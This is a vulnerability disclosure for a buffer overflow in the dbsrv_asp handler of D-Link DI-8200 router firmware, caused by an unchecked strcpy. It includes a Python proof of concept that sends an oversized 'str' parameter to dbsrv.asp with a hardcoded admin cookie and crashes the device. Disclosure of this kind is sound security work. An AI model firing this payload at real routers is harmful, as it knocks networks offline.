Firmware version:

DI_8200-16.07.26A1
	
Download address:

http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8200

buffer overflow:
dbsrv_asp function has a buffer overflow；v32 length 1200，a1 is the passed parameter，v3 is the value of str，The length is not judged when the strcpy function is executed，This results in an overflow；
![[Pasted image 20240808182053.png]]
![[Pasted image 20240808181937.png]]
![[Pasted image 20240808182027.png]]

FirmAE simulates the firmware overflow process, which eventually causes the program crash page to be inaccessible;
![[763b646e75e80fa8437067a478f1836.png]]
![[3082963502cf0d16241f9d323881892.png]]
![[75dfe072da35cfe4dd94491a7bb04b6.png]]

POC：

```
import requests
from pwn import *
    
target_ip = "192.168.0.1"
target_port = 80
  
payload = b'a'*5120
 
url = f"http://{target_ip}/dbsrv.asp?"
 
cookie = {"wys_userid": "admin,wys_passwd=861A198CDBD425F0B9D91C42FAB93A86"}
 
headers = {
    "Accept": "application/json, text/javascript, */*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.3    6",
    "Referer": "http://192.168.0.1/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh,en-US;q=0.9,en;q=0.8",
    "Connection": "close"
  }
  
  params = {
      "str":{payload}
  }
 
  requests.get(url, params=params, cookies=cookie)
```
